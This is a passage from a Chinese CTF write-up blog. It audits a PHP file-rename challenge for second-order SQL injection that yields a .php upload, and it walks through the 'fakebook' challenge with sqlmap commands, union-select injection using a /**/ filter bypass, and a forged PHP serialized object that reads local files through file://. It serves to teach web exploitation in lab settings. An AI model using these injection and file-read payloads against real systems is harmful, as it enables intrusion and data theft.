class="variable">$key</span>] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$value</span>);<span class="comment">#值是string 并且请求中的值为addslashes的值&#x27;&quot;\%00</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;UPLOAD_DIR&quot;</span>, <span class="string">&quot;upload/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">redirect</span>(<span class="params"><span class="variable">$location</span></span>) </span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">&#123;$location&#125;</span>&quot;</span>);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里是数据库的配置文件的信息,对所有的提交数据进行了addslashes转义,当开启gpc魔术方法之后会产生过滤,这里发现并没有,那么如果数据库并没有使用gkb编码的话就无法宽字节绕过,这里未知所以无法直接注入</p>
<p><strong>upload</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: phithon</span></span><br><span class="line"><span class="comment"> * Date: 15/10/14</span></span><br><span class="line"><span class="comment"> * Time: 下午8:45</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;common.inc.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>) &#123;<span class="comment">#如果是文件</span></span><br><span class="line">	<span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;upfile&quot;</span>];  <span class="comment">#将upfile以数组形式进行返回</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&quot;error&quot;</span>] == UPLOAD_ERR_OK) &#123;<span class="comment">#如果上传文件没有错误的话</span></span><br><span class="line">		<span class="variable">$name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>]);<span class="comment">#得到文件的名字并将其转换为一个全路径的字符串</span></span><br><span class="line">		<span class="variable">$path_parts</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>);<span class="comment">#以数组的形式返回文件的路径为一个列表其中extension就是文件的扩展名</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$path_parts</span>[<span class="string">&quot;extension&quot;</span>], <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;zip&quot;</span>, <span class="string">&quot;txt&quot;</span>))) &#123;<span class="comment">#定义白名单,如果扩展名不在这个数组里面就退出</span></span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">&quot;error extension&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$path_parts</span>[<span class="string">&quot;extension&quot;</span>] = <span class="string">&quot;.&quot;</span> . <span class="variable">$path_parts</span>[<span class="string">&quot;extension&quot;</span>];<span class="comment">#文件的扩展名前面加点</span></span><br><span class="line"></span><br><span class="line">		<span class="variable">$name</span> = <span class="variable">$path_parts</span>[<span class="string">&quot;filename&quot;</span>] . <span class="variable">$path_parts</span>[<span class="string">&quot;extension&quot;</span>];<span class="comment">#文件名字加扩展名</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// $path_parts[&quot;filename&quot;] = $db-&gt;quote($path_parts[&quot;filename&quot;]);</span></span><br><span class="line">		<span class="comment">// Fix</span></span><br><span class="line">		<span class="variable">$path_parts</span>[<span class="string">&#x27;filename&#x27;</span>] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$path_parts</span>[<span class="string">&#x27;filename&#x27;</span>]);<span class="comment">#对得到的文件名进行转义主要转义&#x27;\&quot;%00</span></span><br><span class="line"></span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;select * from `file` where `filename`=&#x27;<span class="subst">&#123;$path_parts[&#x27;filename&#x27;]&#125;</span>&#x27; and `extension`=&#x27;<span class="subst">&#123;$path_parts[&#x27;extension&#x27;]&#125;</span>&#x27;&quot;</span>;<span class="comment">#将文件名和扩展名进行查询</span></span><br><span class="line"></span><br><span class="line">		<span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$fetch</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">&quot;file is exists&quot;</span>);<span class="comment">#如果匹配到行数大于0就说明问文件已经存在</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>], UPLOAD_DIR . <span class="variable">$name</span>)) &#123;<span class="comment">#没找到就移动文件就上传到upload/目录下面</span></span><br><span class="line"></span><br><span class="line">			<span class="variable">$sql</span> = <span class="string">&quot;insert into `file` ( `filename`, `view`, `extension`) values( &#x27;<span class="subst">&#123;$path_parts[&#x27;filename&#x27;]&#125;</span>&#x27;, 0, &#x27;<span class="subst">&#123;$path_parts[&#x27;extension&#x27;]&#125;</span>&#x27;)&quot;</span>;<span class="comment">#插入file表里面filename 0 和 extension</span></span><br><span class="line">			<span class="variable">$re</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span> (!<span class="variable">$re</span>) &#123;</span><br><span class="line">				<span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">				<span class="keyword">exit</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$url</span> = <span class="string">&quot;/&quot;</span> . UPLOAD_DIR . <span class="variable">$name</span>;<span class="comment">#给出url</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;Your file is upload, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\&quot;<span class="subst">&#123;$url&#125;</span>\&quot; target=&#x27;_blank&#x27;&gt;<span class="subst">&#123;$url&#125;</span>&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\&quot;/\&quot;&gt;go back&lt;/a&gt;&quot;</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">&quot;upload error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">error_get_last</span>());</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里是对上传的白名单,并且仅仅是上传操作,并没有转码等操作,%00无法截断的话是无法造成.php文件的,所以直接上传是无法进行利用的.</p>
<p><strong>rename</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: phithon</span></span><br><span class="line"><span class="comment"> * Date: 15/10/14</span></span><br><span class="line"><span class="comment"> * Time: 下午9:39</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;common.inc.php&quot;</span>;<span class="comment">#加载文件一次</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$req</span>[<span class="string">&#x27;oldname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>])) &#123;<span class="comment">#如果设置了老名字  设置了新名字</span></span><br><span class="line">	<span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from `file` where `filename`=&#x27;<span class="subst">&#123;$req[&#x27;oldname&#x27;]&#125;</span>&#x27;&quot;</span>);<span class="comment">#从数据库查询老名字</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="variable">$result</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();<span class="comment">#从结果级中取一行为关联数组</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">&quot;old file doesn&#x27;t exists!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$result</span>) &#123;<span class="comment">#如果返回超过一行结果</span></span><br><span class="line"></span><br><span class="line">		<span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>] = <span class="title function_ invoke__">basename</span>(<span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>]);<span class="comment">#reqnewname将路径中的文件名进行返回</span></span><br><span class="line">		<span class="variable">$re</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;update `file` set `filename`=&#x27;<span class="subst">&#123;$req[&#x27;newname&#x27;]&#125;</span>&#x27;, `oldname`=&#x27;&#x27; where `fid`=<span class="subst">&#123;$result[&#x27;fid&#x27;]&#125;</span>&quot;</span>);<span class="comment">#更新名字为新名字老命自为低了那么</span></span><br><span class="line">		<span class="comment">#$re = $db-&gt;query(&quot;update `file` set `filename`=&#x27;&#123;$req[&#x27;newname&#x27;]&#125;&#x27;, `oldname`=&#x27;&#x27;,`extension`=&#x27;&#x27; where `fid`=&#123;$result[&#x27;fid&#x27;]&#125;&quot;);#更新名字为新名字老命自为低了那么</span></span><br><span class="line">		<span class="keyword">if</span> (!<span class="variable">$re</span>) &#123;</span><br><span class="line">			<span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">			<span class="keyword">exit</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$oldname</span> = UPLOAD_DIR . <span class="variable">$result</span>[<span class="string">&quot;filename&quot;</span>] . <span class="variable">$result</span>[<span class="string">&quot;extension&quot;</span>];<span class="comment">#老名字等于路径加文件名加扩展名</span></span><br><span class="line">		<span class="variable">$newname</span> = UPLOAD_DIR . <span class="variable">$req</span>[<span class="string">&quot;newname&quot;</span>] . <span class="variable">$result</span>[<span class="string">&quot;extension&quot;</span>];<span class="comment">#新名字等于上传路径加新名字加扩展名</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$oldname</span>)) &#123;<span class="comment">#如果老命字存在的话</span></span><br><span class="line">			<span class="title function_ invoke__">rename</span>(<span class="variable">$oldname</span>, <span class="variable">$newname</span>);<span class="comment">#重名名老命字为新名字</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$url</span> = <span class="string">&quot;/&quot;</span> . <span class="variable">$newname</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Your file is rename, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\&quot;<span class="subst">&#123;$url&#125;</span>\&quot; target=&#x27;_blank&#x27;&gt;<span class="subst">&#123;$url&#125;</span>&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\&quot;/\&quot;&gt;go back&lt;/a&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里是rename重命名首先这里面的数据是从数据库中掏出来的,而从数据库中出来的数据会将在添加如数据库之前的\进行去除,那么这里就有可能造成二次注入 ,也就是先填入数据库中,在从数据库中取出来,在拼接到后面的语句上,造成二次注入.这里还有对extension与输入文件名的拼接操作,这里如果new文件名为1.php,并且extension为空的话就可以构造出.php为后缀的文件.</p>
<p>那么我们反过来看要输入一个新文件名字为1.php并且extension为空的话就可以利用.file_exists还要存在,这里的存在的老名字是全体名字也就是1.txt.也就是存在一个1.txt的文件那么我们要使1.txt的extension的值为空就需要利用update来注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$re</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;update `file` set `filename`=&#x27;<span class="subst">&#123;$req[&#x27;newname&#x27;]&#125;</span>&#x27;, `oldname`=&#x27;&#x27;,`extension`=&#x27;&#x27; where `fid`=<span class="subst">&#123;$result[&#x27;fid&#x27;]&#125;</span>&quot;</span>);<span class="comment">#更新名字</span></span><br></pre></td></tr></table></figure>

<p>也就是上传一个’,<code>extension</code>&#x3D;’.txt为后缀的文件名的文件,这里会将.txt去除因此最后拼接起来就将1.txt的extension值替换为空了,但是仔细考虑,这里接着会继续向下走,会把名字拼接成1.txt.txt,但是此时数据库里的值是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=1.txt extension=&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>但是这里是数据库里的值,真正的upload目录下是没有1.txt这个文件的.而是1.txt.txt文件,那么如果需要绕过file_exists()的话就需要再次上传1.txt文件.</p>
<p>接着就是对1.txt文件改名,前面我们已经说过了,现在数据库里的1.txt文件的extension值为空,那么我们对他进行重命名时会,从数据库里去除extension的值与新文件名进行拼接,那么如果上传一个1.php就会变成1.php+’’为1.php</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203132050856.png" alt="image-20220313205016785"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203132053352.png" alt="image-20220313205305278"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203132054841.png" alt="image-20220313205436774"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203132055782.png" alt="image-20220313205517709"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203132055083.png" alt="image-20220313205547018"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203132056690.png" alt="image-20220313205633638"></p>
<p>连接即可</p>
<h1 id="攻防世界fakebook"><a href="#攻防世界fakebook" class="headerlink" title="攻防世界fakebook"></a>攻防世界fakebook</h1><p>打开网页有login 与join界面login弱口令登录试试,登录使用sqlmap跑一下看有无注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r C:\Users\14980\Desktop\text1.txt --level 4  --dbs --batch</span><br></pre></td></tr></table></figure>

<p>查看一下源码,在扫描一下目录</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101038987.png" alt="image-20220310103853926"></p>
<p>发现这些挨个访问看看在robots.txt页面发现有</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /user.php.bak</span><br></pre></td></tr></table></figure>

<p>上面的文件虽然存在但是却无法访问到,有可能是因为权限不够,需要找系统中访问的其他方式</p>
<p>接下来下载下来user.php.bak得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span>&#123;    </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;   </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;   </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;   </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)    </span>&#123;     </span><br><span class="line"><span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;      </span><br><span class="line"><span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;        </span><br><span class="line"><span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;    &#125;   </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)    </span>&#123;        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();<span class="comment">//初始化一个url回话        curl_setopt($ch, CURLOPT_URL, $url);//设置需要抓取的url        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//设置url参数,要求结果保存到字符串还是输出到屏幕    </span></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);<span class="comment">//运行curl,请求网页     </span></span><br><span class="line"><span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);<span class="comment">//获取一个curl连接资源句柄的信息      </span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;        </span><br><span class="line"><span class="keyword">return</span> <span class="number">404</span>;        &#125;        </span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);<span class="comment">//关闭一个curl会话     </span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$output</span>;    &#125;   </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)    </span>&#123;     </span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable language_">$this</span>-&gt;blog);    &#125;  </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)    </span>&#123;    </span><br><span class="line"><span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;      </span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);    &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>访问 view.php发现报错信息,得到绝对路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/www/html/view.php </span><br></pre></td></tr></table></figure>

<p>这里对join 注册页面进行抓包使用sqlmap抓包看看有无注入发现有一个注入点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r C:\Users\14980\Desktop\text1.txt  -dbs --batch	//这里得到数据库名</span><br><span class="line">available databases [5]:</span><br><span class="line">[*] fakebook</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] test</span><br><span class="line"></span><br><span class="line">python sqlmap.py -r C:\Users\14980\Desktop\text1.txt  -D fakebook --tables --batch   //这里得到表名</span><br><span class="line">users</span><br><span class="line"></span><br><span class="line">python sqlmap.py -r C:\Users\14980\Desktop\text1.txt  -D fakebook -T users --dump --batch	//这里得到字段</span><br><span class="line">-----------------------------------------------------------------+</span><br><span class="line">| no   | data | passwd    | username                                                 ---------------------------------------------+</span><br><span class="line">| 1    | O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:6:&quot;1.blog&quot;;&#125; | 1f40fc92da241694750979ee6cf582f2d5d7d28e18335de05abc54d0560e0f5302860c652bf08d560252aa5e74210546f369fbbbce8c12cfc7957b2652fe9a75 (a) | admin   |</span><br><span class="line">| 2    | O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:100:&quot;admin&#x27; AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM fakebook.users),1,1))&gt;51-- yBdB&quot;;s:3:&quot;age&quot;;i:4;s:4:&quot;blog&quot;;s:6:&quot;1.blog&quot;;&#125; | 1f40fc92da241694750979ee6cf582f2d5d7d28e18335de05abc54d0560e0f5302860c652bf08d560252aa5e74210546f369fbbbce8c12cfc7957b2652fe9a75 (a) | admin&#x27; AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM fakebook.users),1,1))&gt;51-- yBdB |</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注册完成登录进去之后会发现只有一个username可以点击可以发现其在访问页面,在url中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:64253/view.php?no=1</span><br></pre></td></tr></table></figure>

<p>尝试一下sql注入发现报错信息</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101042353.png" alt="image-20220310104235297"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:64253/view.php?no=1 and 1=1#	正常</span><br><span class="line">http://111.200.241.244:64253/view.php?no=1 and 1=2#	错误</span><br></pre></td></tr></table></figure>

<p>可以发现有注入点,这里发现字段数为4</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">view.php?no=1 order by 3#	错误</span><br><span class="line">view.php?no=1 order by 4#	正常</span><br><span class="line">view.php?no=1 order by 5#	错误</span><br></pre></td></tr></table></figure>

<p>在这里发现网页有对sql注入语句的过滤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:64253/view.php?no=-1 union select 1,2,3,4#</span><br></pre></td></tr></table></figure>

<p>这里经过fuzz发现单个的字符并未进行过滤而是过滤的union select整个语句所以这里使用注释符&#x2F;**&#x2F;进行绕过,或者++进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:64253/view.php?no=-1 union++select 1,2,3,4</span><br><span class="line">http://111.200.241.244:64253/view.php?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101043115.png" alt="image-20220310104318999"></p>
<p>这里发现2字段可以使用这里直接使用load_file()函数获取系统文件要求,权限较高,且要求文件的绝对路径,这里并没有</p>
<p>这里继续注入一下其他内容看看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:64253/view.php?no=-1 union/**/select 1,user(),3,4</span><br><span class="line">//获得用户名</span><br><span class="line">root@localhost </span><br><span class="line"></span><br><span class="line">http://111.200.241.244:64253/view.php?no=-1 union/**/select 1,database(),3,4</span><br><span class="line">//获得数据库名</span><br><span class="line">fakebook </span><br><span class="line"></span><br><span class="line">http://111.200.241.244:64253/view.php?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&quot;fakebook&quot;#</span><br><span class="line">//获取fakebook中的表名</span><br><span class="line">users</span><br><span class="line"></span><br><span class="line">http://111.200.241.244:64253/view.php?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&quot;users&quot;#</span><br><span class="line">//获取数据库名为fakebook,表名为users中的字段名</span><br><span class="line">no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS </span><br><span class="line"></span><br><span class="line">http://111.200.241.244:63407//view.php?no=-1 union/**/select 1,group_concat(data,username,passwd),3,4 from users where no=1#</span><br><span class="line">//获取数据库名为fakebook,表名为users中的字段名为data,username,passwd的值</span><br><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;a&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:38:&quot;https://zhuanlan.zhihu.com/p/161412754&quot;;&#125;a1f40fc92da241694750979ee6cf582f2d5d7d28e18335de05abc54d0560e0f5302860c652bf08d560252aa5e74210546f369fbbbce8c12cfc7957b2652fe9a75 </span><br></pre></td></tr></table></figure>

<p>这里的序列化对象便与之前的获得到的user.php.bak 进行了对应 这里便是进行反序列化了class UserInfo{}类</p>
<p>最开始时的用户页面no&#x3D;1时，页面返回用户的用户名、密码、博客之类的消息。毫无疑问，页面是根据users表中no&#x3D;1的这条数据，渲染的页面。因为回显，我们只证明了查询语句的第二个字段是username。其余三个字段并不明确，但我们可以猜测，应该和数据库表中的字段顺序相似。第四个字段应该就是data，而我们现在有一个现成的data数据，能否模拟下？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:63407//view.php?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;a&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:38:&quot;https://zhuanlan.zhihu.com/p/161412754&quot;;&#125;&#x27;#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101045078.png" alt="image-20220310104526968"></p>
<p>注意no现在的值为2，我们知道这个用户是不存在的。换而言之，原SQL语句的查询结果为空，而我们通过union加入了我们构造的查询语句，让SQL语句有了查询结果，并且此查询结果符合页面渲染要求，所以页面正常显示了。并且由此得知，只要有data字段的对象序列，就可以成功渲染页面，其他字段并不是很重要。（页面中age和blog的值，显然也都是从序列化的对象里面得到的）</p>
<p>因此这里需要构造blog参数的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<p>原因是在源码中有blog的base64编码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">width</span>=<span class="string">&#x27;100%&#x27;</span> <span class="attr">height</span>=<span class="string">&#x27;10em&#x27;</span> <span class="attr">src</span>=<span class="string">&#x27;data:text/html;base64,&#x27;</span>&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>这里利用了File协议读取本地文件,使用PHP构造出payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;s&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">UserInfo</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;s&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>接着进行访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:63407//view.php?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;s&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到base64加密文件</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101047862.png" alt="image-20220310104731820"></p>
<p>这里进行base64解密得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;c1e552fdf77049fabf65168f22f7aeab&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>也可以直接点击链接</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101047366.png" alt="image-20220310104743329"></p>
<h1 id="后端django服务gbk编码导致宽字符绕过"><a href="#后端django服务gbk编码导致宽字符绕过" class="headerlink" title="后端django服务gbk编码导致宽字符绕过"></a>后端django服务gbk编码导致宽字符绕过</h1><p>打开发现一个ping命令输入127.0.0.1发现执行成功,推测可能是命令拼接,但是输入任何有关拼接的字符串会提示invalid url </p>
<p>写一个脚本测试一下过滤了哪些字符</p>
